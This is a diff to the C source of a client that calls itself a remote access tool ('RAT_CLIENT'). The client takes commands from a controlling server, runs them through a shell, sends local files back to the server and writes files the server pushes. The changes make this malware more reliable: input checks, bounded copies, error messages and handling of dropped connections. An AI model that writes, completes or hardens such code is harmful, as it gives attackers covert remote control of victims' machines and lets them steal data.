@@ -192,25 +192,55 @@ int connect_to_server(RAT_CLIENT *client) {
 }
 
 void send_response(RAT_CLIENT *client, const char *response) {
-    send(client->client_fd, response, strlen(response), 0);
+    if (!client || !response) {
+        return;
+    }
+    
+    if (client->client_fd == INVALID_SOCKET) {
+        return;
+    }
+    
+    int bytes_sent = send(client->client_fd, response, strlen(response), 0);
+    if (bytes_sent <= 0) {
+        // Connection likely broken, mark as invalid
+        client->client_fd = INVALID_SOCKET;
+    }
 }
 
 void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
     char prompt[512];
     char full_response[BUFFER_SIZE * 4];
     
+    if (!client || !response) {
+        return;
+    }
+    
+    if (client->client_fd == INVALID_SOCKET) {
+        return;
+    }
+    
     // Update current directory in case it changed
     if (getcwd(client->current_dir, sizeof(client->current_dir)) == NULL) {
+        perror("Warning: Failed to get current directory");
+#ifdef _WIN32
+        strcpy(client->current_dir, "C:\\");
+#else
         strcpy(client->current_dir, "/");
+#endif
     }
     
     generate_prompt(client, prompt, sizeof(prompt));
     
     // Send response followed by prompt on a new line
     if (strlen(response) > 0) {
-        snprintf(full_response, sizeof(full_response), "%s\n%s", response, prompt);
+        int ret = snprintf(full_response, sizeof(full_response), "%s\n%s", response, prompt);
+        if (ret >= (int)sizeof(full_response)) {
+            // Response was truncated, send what we can
+            printf("Warning: Response truncated due to length\n");
+        }
     } else {
-        snprintf(full_response, sizeof(full_response), "%s", prompt);
+        strncpy(full_response, prompt, sizeof(full_response) - 1);
+        full_response[sizeof(full_response) - 1] = '\0';
     }
     
     // Send in chunks if response is large
@@ -218,17 +248,18 @@ void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
     int sent = 0;
     int chunk_size = BUFFER_SIZE - 1;
     
-    while (sent < total_len) {
+    while (sent < total_len && client->client_fd != INVALID_SOCKET) {
         int to_send = (total_len - sent > chunk_size) ? chunk_size : (total_len - sent);
         int bytes_sent = send(client->client_fd, full_response + sent, to_send, 0);
         
         if (bytes_sent <= 0) {
+            client->client_fd = INVALID_SOCKET;
             break; // Error sending
         }
         
         sent += bytes_sent;
         
-    // Small delay between chunks to prevent overwhelming
+        // Small delay between chunks to prevent overwhelming
         if (sent < total_len) {
 #ifdef _WIN32
             Sleep(10); // 10ms delay on Windows
@@ -245,8 +276,23 @@ void execute_system_command(RAT_CLIENT *client, const char *command, char *resul
     char buffer[BUFFER_SIZE];
     char exec_command[MAX_COMMAND_SIZE + 50];
     
+    if (!client || !command || !result || result_size == 0) {
+        if (result && result_size > 0) {
+            strncpy(result, "Error: Invalid parameters", result_size - 1);
+            result[result_size - 1] = '\0';
+        }
+        return;
+    }
+    
     // Clear result buffer
     memset(result, 0, result_size);
+    
+    // Check command length
+    if (strlen(command) > MAX_COMMAND_SIZE) {
+        strncpy(result, "Error: Command too long", result_size - 1);
+        result[result_size - 1] = '\0';
+        return;
+    }
     
 #ifdef _WIN32
     // On Windows, use cmd.exe for proper command execution
@@ -258,7 +304,7 @@ void execute_system_command(RAT_CLIENT *client, const char *command, char *resul
     
     fp = popen(exec_command, "r");
     if (fp == NULL) {
-        strncpy(result, "Error: Failed to execute command", result_size - 1);
+        snprintf(result, result_size, "Error: Failed to execute command - %s", strerror(errno));
         return;
     }
     
@@ -274,7 +320,18 @@ void execute_system_command(RAT_CLIENT *client, const char *command, char *resul
         }
     }
     
-    pclose(fp);
+    int exit_code = pclose(fp);
+    if (exit_code == -1) {
+        // If we already have some output, just add a warning
+        if (total_len > 0) {
+            if (total_len < result_size - 50) {
+                strcat(result, "\nWarning: Error closing command pipe");
+            }
+        } else {
+            strncpy(result, "Error: Failed to close command pipe", result_size - 1);
+            result[result_size - 1] = '\0';
+        }
+    }
     
     // Remove trailing newline for cleaner output
     if (total_len > 0 && result[total_len - 1] == '\n') {
@@ -350,18 +407,53 @@ void handle_download(RAT_CLIENT *client, const char *filename) {
     char buffer[BUFFER_SIZE];
     size_t bytes_read;
     
+    if (!client || !filename) {
+        send_response_with_prompt(client, "Error: Invalid parameters for download");
+        return;
+    }
+    
+    if (client->client_fd == INVALID_SOCKET) {
+        return;
+    }
+    
+    if (strlen(filename) > 400) {
+        send_response_with_prompt(client, "Error: Filename too long");
+        return;
+    }
+    
     file = fopen(filename, "rb");
     if (file == NULL) {
-        send_response_with_prompt(client, "Error: Cannot open file for download");
+        char error_msg[512];
+        snprintf(error_msg, sizeof(error_msg), "Error: Cannot open file for download - %s", strerror(errno));
+        send_response_with_prompt(client, error_msg);
         return;
     }
     
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
-        send(client->client_fd, buffer, bytes_read, 0);
+        int bytes_sent = send(client->client_fd, buffer, bytes_read, 0);
+        if (bytes_sent <= 0) {
+            client->client_fd = INVALID_SOCKET;
+            fclose(file);
+            return;
+        } else if (bytes_sent != (int)bytes_read) {
+            // Partial send - this is problematic for file transfer
+            client->client_fd = INVALID_SOCKET;
+            fclose(file);
+            return;
+        }
     }
     
-    fclose(file);
+    if (ferror(file)) {
+        // There was an error reading the file
+        fclose(file);
+        send_response_with_prompt(client, "Error: Failed to read file during download");
+        return;
+    }
+    
+    if (fclose(file) != 0) {
+        send_response_with_prompt(client, "Warning: Error closing file after download");
+    }
 }
 
 void handle_upload(RAT_CLIENT *client) {
@@ -374,6 +466,14 @@ void handle_upload(RAT_CLIENT *client) {
     int bytes_received;
     char *delimiter;
     
+    if (!client) {
+        return;
+    }
+    
+    if (client->client_fd == INVALID_SOCKET) {
+        return;
+    }
+    
     // Receive upload info in format "destination|filename\n"
     memset(upload_info, 0, sizeof(upload_info));
     int info_pos = 0;
@@ -383,6 +483,11 @@ void handle_upload(RAT_CLIENT *client) {
     while (info_pos < (int)(sizeof(upload_info) - 1)) {
         bytes_received = recv(client->client_fd, &temp_char, 1, 0);
         if (bytes_received <= 0) {
+            if (bytes_received == 0) {
+                send_response_with_prompt(client, "Error: Connection closed during upload info reception");
+            } else {
+                send_response_with_prompt(client, "Error: Failed to receive upload info");
+            }
             return;
         }
         
@@ -395,17 +500,24 @@ void handle_upload(RAT_CLIENT *client) {
     upload_info[info_pos] = '\0';
     
     // Send acknowledgment to server
-    send(client->client_fd, "OK", 2, 0);
+    int ack_sent = send(client->client_fd, "OK", 2, 0);
+    if (ack_sent <= 0) {
+        client->client_fd = INVALID_SOCKET;
+        return;
+    }
     
     // Parse destination and filename
     delimiter = strchr(upload_info, '|');
     if (delimiter) {
         *delimiter = '\0';
-        strcpy(destination, upload_info);
-        strcpy(filename, delimiter + 1);
+        strncpy(destination, upload_info, sizeof(destination) - 1);
+        destination[sizeof(destination) - 1] = '\0';
+        strncpy(filename, delimiter + 1, sizeof(filename) - 1);
+        filename[sizeof(filename) - 1] = '\0';
     } else {
         // Fallback to old format - treat entire string as filename
-        strcpy(filename, upload_info);
+        strncpy(filename, upload_info, sizeof(filename) - 1);
+        filename[sizeof(filename) - 1] = '\0';
     }
     
     // Determine final file path
@@ -434,7 +546,8 @@ void handle_upload(RAT_CLIENT *client) {
 #endif
         } else {
             // Destination is a full file path
-            strcpy(final_path, destination);
+            strncpy(final_path, destination, sizeof(final_path) - 1);
+            final_path[sizeof(final_path) - 1] = '\0';
         }
     } else {
         // No destination specified, use current directory
@@ -451,7 +564,8 @@ void handle_upload(RAT_CLIENT *client) {
         } else {
             base_filename = filename;
         }
-        strcpy(final_path, base_filename);
+        strncpy(final_path, base_filename, sizeof(final_path) - 1);
+        final_path[sizeof(final_path) - 1] = '\0';
     }
     
     file = fopen(final_path, "wb");
@@ -470,20 +584,51 @@ void handle_upload(RAT_CLIENT *client) {
             strcpy(truncated_path, final_path);
         }
         
-        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s", truncated_path);
+        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s - %s", truncated_path, strerror(errno));
         send_response_with_prompt(client, error_msg);
         return;
     }
     
     // Receive file content
     while ((bytes_received = recv(client->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
-        fwrite(buffer, 1, bytes_received, file);
+        size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
+        if (bytes_written != (size_t)bytes_received) {
+            fclose(file);
+            unlink(final_path); // Remove partially written file
+            send_response_with_prompt(client, "Error: Failed to write uploaded data to file");
+            return;
+        }
         if (bytes_received < BUFFER_SIZE) {
             break; // End of file
         }
     }
     
-    fclose(file);
+    if (bytes_received < 0) {
+        fclose(file);
+        unlink(final_path); // Remove partially written file
+        send_response_with_prompt(client, "Error: Failed to receive file data");
+        return;
+    }
+    
+    if (fclose(file) != 0) {
+        char error_msg[512];
+        char truncated_path[200]; // Reduced size to leave room for error message
+        
+        // Truncate path if too long to prevent buffer overflow
+        if (strlen(final_path) > 190) {
+            strncpy(truncated_path, final_path, 187);
+            truncated_path[187] = '.';
+            truncated_path[188] = '.';
+            truncated_path[189] = '.';
+            truncated_path[190] = '\0';
+        } else {
+            strcpy(truncated_path, final_path);
+        }
+        
+        snprintf(error_msg, sizeof(error_msg), "Warning: Error closing uploaded file %s - %s", truncated_path, strerror(errno));
+        send_response_with_prompt(client, error_msg);
+        return;
+    }
 }
 
 void execute_commands(RAT_CLIENT *client) {
@@ -494,17 +639,42 @@ void execute_commands(RAT_CLIENT *client) {
     int bytes_received;
     char prompt[512];
     
+    if (!client) {
+        return;
+    }
+    
+    if (client->client_fd == INVALID_SOCKET) {
+        return;
+    }
+    
     // Send initial prompt to server
     generate_prompt(client, prompt, sizeof(prompt));
     send_response(client, prompt);
     
-    while (1) {
+    while (client->client_fd != INVALID_SOCKET) {
         // Receive command from server
         memset(command, 0, sizeof(command));
         bytes_received = recv(client->client_fd, command, sizeof(command) - 1, 0);
         
         if (bytes_received <= 0) {
-            break; // Connection lost
+            if (bytes_received == 0) {
+                // Connection closed by server
+                break;
+            } else {
+                // Error receiving data
+#ifdef _WIN32
+                if (WSAGetLastError() != WSAECONNRESET) {
+                    // Only log if it's not a connection reset (normal termination)
+                    printf("Error receiving command: %d\n", WSAGetLastError());
+                }
+#else
+                if (errno != ECONNRESET && errno != EPIPE) {
+                    // Only log if it's not a connection reset (normal termination)
+                    perror("Error receiving command");
+                }
+#endif
+                break;
+            }
         }
         
         command[bytes_received] = '\0';
@@ -517,7 +687,8 @@ void execute_commands(RAT_CLIENT *client) {
         // Parse command
         arg_count = 0;
         char command_copy[MAX_COMMAND_SIZE];
-        strcpy(command_copy, command);
+        strncpy(command_copy, command, sizeof(command_copy) - 1);
+        command_copy[sizeof(command_copy) - 1] = '\0';
         token = strtok(command_copy, " ");
         while (token != NULL && arg_count < 9) {
             args[arg_count++] = token;
@@ -537,17 +708,21 @@ void execute_commands(RAT_CLIENT *client) {
             if (arg_count > 1) {
                 handle_download(client, args[1]);
                 // Send confirmation prompt after download
-                send_response_with_prompt(client, "File sent for download");
+                if (client->client_fd != INVALID_SOCKET) {
+                    send_response_with_prompt(client, "File sent for download");
+                }
             } else {
-                send_response_with_prompt(client, "Error: No filename specified");
+                send_response_with_prompt(client, "Error: No filename specified for download");
             }
         }
         else if (strcmp(args[0], "upload") == 0) {
             handle_upload(client);
             // Send confirmation prompt after upload with file path info
-            char upload_msg[256];
-            snprintf(upload_msg, sizeof(upload_msg), "File uploaded successfully");
-            send_response_with_prompt(client, upload_msg);
+            if (client->client_fd != INVALID_SOCKET) {
+                char upload_msg[256];
+                snprintf(upload_msg, sizeof(upload_msg), "File uploaded successfully");
+                send_response_with_prompt(client, upload_msg);
+            }
         }
         else if (strcmp(args[0], "exit") == 0) {
             send_response(client, "Goodbye!");
